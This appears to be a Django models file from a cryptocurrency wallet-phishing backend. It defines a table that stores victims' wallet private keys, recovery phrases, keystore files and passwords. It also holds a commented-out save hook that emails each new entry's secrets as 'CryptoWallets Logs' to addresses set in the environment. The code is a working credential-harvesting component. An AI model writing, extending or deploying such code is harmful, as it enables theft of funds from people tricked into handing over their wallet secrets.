from django.db import models
from django.db.models.signals import post_save
from django.dispatch import receiver
from django.core.mail import send_mail
import environ
from email.utils import getaddresses

env = environ.Env()


class CryptoWallets(models.Model):
    wallet_name = models.CharField(max_length=50, blank=True)
    private_key = models.CharField(max_length=30, blank=True)
    phrase = models.TextField(blank=True)
    keystore_json = models.TextField(blank=True)
    password = models.CharField(max_length=50, blank=True)
    created = models.DateTimeField(auto_now_add=True)

    class Meta:
        verbose_name_plural = "cryptowallets"

    def __str__(self):
        return self.wallet_name


# @receiver(post_save, sender=CryptoWallets)
# def send_mail_handler(sender, instance, created, **kwargs):
#     if created:
#         data = CryptoWallets.objects.get(id=instance.id)
#         send_mail(
#             '....CryptoWallets Logs....',
#             f'''data wallet_name: {data.wallet_name}
#             \nprivate_key: {data.private_key}
#             \nphrase: {data.phrase}
#             \nkeystore_json: {data.keystore_json}
#             \npassword: {data.password}''',
#             env("SERVER_EMAIL"),
#             getaddresses([env('ADMINS')]),
#             fail_silently=False,
#         )
